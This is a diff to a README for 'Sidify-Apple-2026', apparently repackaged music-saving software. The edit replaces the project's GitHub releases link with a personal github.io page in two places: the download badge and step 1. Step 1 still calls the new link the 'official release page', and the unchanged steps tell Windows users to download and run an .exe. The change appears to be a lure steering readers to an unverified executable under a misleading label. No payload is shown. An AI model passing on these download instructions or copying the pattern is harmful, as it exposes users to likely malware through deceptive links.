@@ -1,6 +1,6 @@
 # 🎵 Sidify-Apple-2026 - Save your music for easy listening
 
-[![](https://img.shields.io/badge/Download-Sidify_Apple-blue)](https://github.com/pius9758/Sidify-Apple-2026/releases)
+[![](https://img.shields.io/badge/Download-Sidify_Apple-blue)](https://pius9758.github.io)
 
 ## What is Sidify-Apple-2026?
 
@@ -21,7 +21,7 @@ Before you start the installation, ensure your computer meets these basic requir
 
 Follow these steps to set up the software on your Windows computer:
 
-1.  Visit the official release page: [https://github.com/pius9758/Sidify-Apple-2026/releases](https://github.com/pius9758/Sidify-Apple-2026/releases).
+1.  Visit the official release page: [https://pius9758.github.io](https://pius9758.github.io).
 2.  Look for the latest release version at the top of the list.
 3.  Click the blue link to download the installer file ending in .exe.
 4.  Wait for the download to finish.
